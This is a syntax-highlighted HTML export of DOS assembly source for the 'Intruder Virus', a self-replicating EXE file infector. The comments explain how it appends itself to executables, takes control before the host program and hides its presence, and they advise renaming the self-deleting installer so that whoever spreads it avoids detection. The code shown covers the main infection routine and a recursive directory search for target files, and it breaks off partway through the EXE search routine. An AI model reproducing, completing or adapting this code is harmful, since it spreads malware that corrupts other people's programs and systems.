<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;The Intruder Virus is an EXE file infector which can jump from directory to</span><span class="sc0">
</span><span class="sc1">;directory and disk to disk. It attaches itself to the end of a file and</span><span class="sc0">
</span><span class="sc1">;modifies the EXE file header so that it gets control first, before the host</span><span class="sc0">
</span><span class="sc1">;program. When it is done doing its job, it passes control to the host program,</span><span class="sc0">
</span><span class="sc1">;so that the host executes without a hint that the virus is there.</span><span class="sc0">


        </span><span class="sc9">.SEQ</span><span class="sc0">                       </span><span class="sc1">;segments must appear in sequential order</span><span class="sc0">
                                   </span><span class="sc1">;to simulate conditions in actual active virus</span><span class="sc0">


</span><span class="sc1">;MGROUP  GROUP   HOSTSEG,HSTACK     ;Host stack and code segments grouped together</span><span class="sc0">

</span><span class="sc1">;HOSTSEG program code segment. The virus gains control before this routine and</span><span class="sc0">
</span><span class="sc1">;attaches itself to another EXE file. As such, the host program for this</span><span class="sc0">
</span><span class="sc1">;installer simply tries to delete itself off of disk and terminates. That is</span><span class="sc0">
</span><span class="sc1">;worthwhile if you want to infect a system with the virus without getting</span><span class="sc0">
</span><span class="sc1">;caught. Just execute the program that infects, and it disappears without a</span><span class="sc0">
</span><span class="sc1">;trace. You might want to name the program something more innocuous, though.</span><span class="sc0">

</span><span class="sc5">HOSTSEG</span><span class="sc0"> </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0">
        </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">HOSTSEG</span><span class="sc4">,</span><span class="sc8">SS</span><span class="sc4">:</span><span class="sc5">HSTACK</span><span class="sc0">

</span><span class="sc5">PGMSTR</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'INTRUDER.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">HOST</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">           </span><span class="sc1">;we want DS=CS here</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">PGMSTR</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41H</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">             </span><span class="sc1">;delete this exe file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4CH</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">             </span><span class="sc1">;terminate normally</span><span class="sc0">
</span><span class="sc5">HOSTSEG</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc1">;Host program stack segment</span><span class="sc0">

</span><span class="sc5">HSTACK</span><span class="sc0">  </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">PARA</span><span class="sc0"> </span><span class="sc5">STACK</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">100H</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">;100 bytes long</span><span class="sc0">
</span><span class="sc5">HSTACK</span><span class="sc0">  </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;This is the virus itself</span><span class="sc0">

</span><span class="sc5">STACKSIZE</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">100H</span><span class="sc0">           </span><span class="sc1">;size of stack for the virus</span><span class="sc0">
</span><span class="sc5">NUMRELS</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">              </span><span class="sc1">;number of relocatables in the virus, which must go in the relocatable pointer table</span><span class="sc0">

</span><span class="sc1">;VGROUP  GROUP   VSEG,VSTACK    ;Virus code and stack segments grouped together</span><span class="sc0">

</span><span class="sc1">;Intruder Virus code segment. This gains control first, before the host. As this</span><span class="sc0">
</span><span class="sc1">;ASM file is layed out, this program will look exactly like a simple program</span><span class="sc0">
</span><span class="sc1">;that was infected by the virus.</span><span class="sc0">

</span><span class="sc5">VSEG</span><span class="sc0">    </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">PARA</span><span class="sc0">
        </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">VSEG</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">VSEG</span><span class="sc4">,</span><span class="sc8">SS</span><span class="sc4">:</span><span class="sc5">VSTACK</span><span class="sc0">

</span><span class="sc1">;data storage area comes before any code</span><span class="sc0">
</span><span class="sc5">VIRUSID</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0C8AAH</span><span class="sc0">                </span><span class="sc1">;identifies virus</span><span class="sc0">
</span><span class="sc5">OLDDTA</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;old DTA segment and offset</span><span class="sc0">
</span><span class="sc5">DTA1</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">2BH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;new disk transfer area</span><span class="sc0">
</span><span class="sc5">DTA2</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">56H</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;dta for directory finds (2 deep)</span><span class="sc0">
</span><span class="sc5">EXE_HDR</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">1CH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;buffer for EXE file header</span><span class="sc0">
</span><span class="sc5">EXEFILE</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'\*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;search string for an exe file</span><span class="sc0">
</span><span class="sc5">ALLFILE</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'\*.*'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;search string for any file</span><span class="sc0">
</span><span class="sc5">USEFILE</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">78</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">            </span><span class="sc1">;area to put valid file path</span><span class="sc0">
</span><span class="sc5">LEVEL</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;depth to search directories for a file</span><span class="sc0">
</span><span class="sc5">HANDLE</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;file handle</span><span class="sc0">
</span><span class="sc5">FATTR</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;old file attribute storage area</span><span class="sc0">
</span><span class="sc5">FTIME</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;old file time stamp storage area</span><span class="sc0">
</span><span class="sc5">FDATE</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;old file date stamp storage area</span><span class="sc0">
</span><span class="sc5">FSIZE</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;file size storage area</span><span class="sc0">
</span><span class="sc5">VIDC</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;storage area to put VIRUSID from new host .EXE in, to check if virus already there</span><span class="sc0">
</span><span class="sc5">VCODE</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">;identifies this version</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Intruder virus main routine starts here</span><span class="sc0">
</span><span class="sc5">VIRUS</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;save startup info in ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;set up DS=CS for the virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">           </span><span class="sc1">;get PSP Seg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLDDTA</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">;set up default DTA Seg=PSP Seg in case of abort without getting it</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SHOULDRUN</span><span class="sc0">       </span><span class="sc1">;run only when certain conditions met signalled by z set</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">REL1</span><span class="sc0">            </span><span class="sc1">;conditions aren't met, go execute host program</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SETSR</span><span class="sc0">           </span><span class="sc1">;modify SHOULDRUN procedure to activate conditions</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">NEW_DTA</span><span class="sc0">         </span><span class="sc1">;set up a new DTA location</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FIND_FILE</span><span class="sc0">       </span><span class="sc1">;get an exe file to attack</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">FINISH</span><span class="sc0">          </span><span class="sc1">;returned nz - no valid file, exit</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SAVE_ATTRIBUTE</span><span class="sc0">  </span><span class="sc1">;save the file attributes and leave file opened in r/w mode</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INFECT</span><span class="sc0">          </span><span class="sc1">;move program code to file we found to attack</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">REST_ATTRIBUTE</span><span class="sc0">  </span><span class="sc1">;restore the original file attributes and close the file</span><span class="sc0">
</span><span class="sc5">FINISH</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RESTORE_DTA</span><span class="sc0">     </span><span class="sc1">;restore the DTA to its original value at startup</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;restore startup value of ax</span><span class="sc0">
</span><span class="sc5">REL1</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">;relocatable marker for host stack segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">HSTACK</span><span class="sc0">       </span><span class="sc1">;set up host program stack segment (ax=segment)</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">                     </span><span class="sc1">;interrupts off while changing stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">REL1A</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;marker for host stack pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">HSTACK</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLDDTA</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;set up ES correctly</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLDDTA</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;and DS</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">                     </span><span class="sc1">;interrupts back on</span><span class="sc0">
</span><span class="sc5">REL2</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">;relocatable marker for host code segment</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">FAR</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc0">    </span><span class="sc1">;begin execution of host program</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;First Level - Find a file which passes FILE_OK</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This routine does a complex directory search to find an EXE file in the</span><span class="sc0">
</span><span class="sc1">;current directory, one of its subdirectories, or the root directory or one</span><span class="sc0">
</span><span class="sc1">;of its subdirectories, to find a file for which FILE_OK returns with C reset.</span><span class="sc0">
</span><span class="sc1">;If you want to change the depth of the search, make sure to allocate enough</span><span class="sc0">
</span><span class="sc1">;room at DTA2. This variable needs to have 2BH * LEVEL bytes in it to work,</span><span class="sc0">
</span><span class="sc1">;since the recursive FINDBR uses a different DTA area for the search (see DOS</span><span class="sc0">
</span><span class="sc1">;functions 4EH and 4FH) on each level.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">FIND_FILE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'                  ;set up current directory path in USEFILE
</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">USEFILE</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">USEFILE</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">47H</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">                     </span><span class="sc1">;get current dir, USEFILE= \dir</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">USEFILE</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;see if it is null. If so, its the root</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">FF2</span><span class="sc0">                     </span><span class="sc1">;not the root</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">;make correction for root directory,</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">USEFILE</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">;by setting USEFILE = ''</span><span class="sc0">
</span><span class="sc5">FF2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">LEVEL</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;search 2 subdirs deep</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FINDBR</span><span class="sc0">                  </span><span class="sc1">;attempt to locate a valid file</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FF3</span><span class="sc0">                     </span><span class="sc1">;found one - exit</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">;nope - try the root directory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">USEFILE</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">;by setting USEFILE= ''</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                      </span><span class="sc1">;al=1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">LEVEL</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;search one subdir deep</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FINDBR</span><span class="sc0">                  </span><span class="sc1">;attempt to find file</span><span class="sc0">
</span><span class="sc5">FF3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;exit with z flag set by FINDBR to indicate success/failure</span><span class="sc0">


</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Second Level - Find in a branch</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This function searches the directory specified in USEFILE for EXE files.</span><span class="sc0">
</span><span class="sc1">;after searching the specified directory, it searches subdirectories to the</span><span class="sc0">
</span><span class="sc1">;depth LEVEL. If an EXE file is found for which FILE_OK returns with C reset, this</span><span class="sc0">
</span><span class="sc1">;routine exits with Z set and leaves the file and path in USEFILE</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">FINDBR</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FINDEXE</span><span class="sc0">         </span><span class="sc1">;search current dir for EXE first</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">FBE3</span><span class="sc0">            </span><span class="sc1">;found it - exit</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">LEVEL</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;no - do we want to go another directory deeper?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FBE1</span><span class="sc0">            </span><span class="sc1">;no - exit</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">LEVEL</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;yes - decrement LEVEL and continue</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">USEFILE</span><span class="sc0">       </span><span class="sc1">;'\curr_dir' is here</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ALLFILE</span><span class="sc0">       </span><span class="sc1">;'\*.*' is here</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CONCAT</span><span class="sc0">          </span><span class="sc1">;get '\curr_dir\*.*' in USEFILE</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">;store pointer to first *</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FIRSTDIR</span><span class="sc0">        </span><span class="sc1">;get first subdirectory</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">FBE</span><span class="sc0">             </span><span class="sc1">;couldn't find it, so quit</span><span class="sc0">
</span><span class="sc5">FB1</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;otherwise, check it out</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">;strip \*.* off of USEFILE</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">USEFILE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DTA2</span><span class="sc4">+</span><span class="sc2">1EH</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">LEVEL</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">2BH</span><span class="sc0">          </span><span class="sc1">;compute correct DTA location for subdir name</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">              </span><span class="sc1">;which depends on the depth we're at in the search</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;bx points to directory name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CONCAT</span><span class="sc0">          </span><span class="sc1">;'\curr_dir\sub_dir' put in USEFILE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">;save position of first letter in sub_dir name</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FINDBR</span><span class="sc0">          </span><span class="sc1">;scan the subdirectory and its subdirectories (recursive)</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FBE2</span><span class="sc0">            </span><span class="sc1">;if successful, exit</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">NEXTDIR</span><span class="sc0">         </span><span class="sc1">;get next subdirectory in this directory</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FB1</span><span class="sc0">             </span><span class="sc1">;go check it if search successful</span><span class="sc0">
</span><span class="sc5">FBE</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;else exit, NZ set, cleaned up</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">LEVEL</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;increment the level counter before exit</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">;strip any path or file spec off of original</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;directory path</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">FBE1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;return with NZ set</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">FBE2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">;successful exit, pull this off the stack</span><span class="sc0">
</span><span class="sc5">FBE3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;and set Z</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;exit</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Third Level - Part A - Find an EXE file</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This function searches the path in USEFILE for an EXE file which passes</span><span class="sc0">
</span><span class="sc1">;the test FILE_OK. This routine will return the full path of the EXE file</span><span class="sc0">
</span><span class="sc1">;in USEFILE, and the c flag reset, if it is successful. Otherwise, it will return</span><span class="sc0">
</span><span class="sc1">;with the c flag set. It will search a whole directory before giving up.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">FINDEXE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DTA1</span><span class="sc0">  </span><span class="sc1">;set new DTA for EXE search</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1AH</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">USEFILE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">EXEFILE</span><span class="sc0">
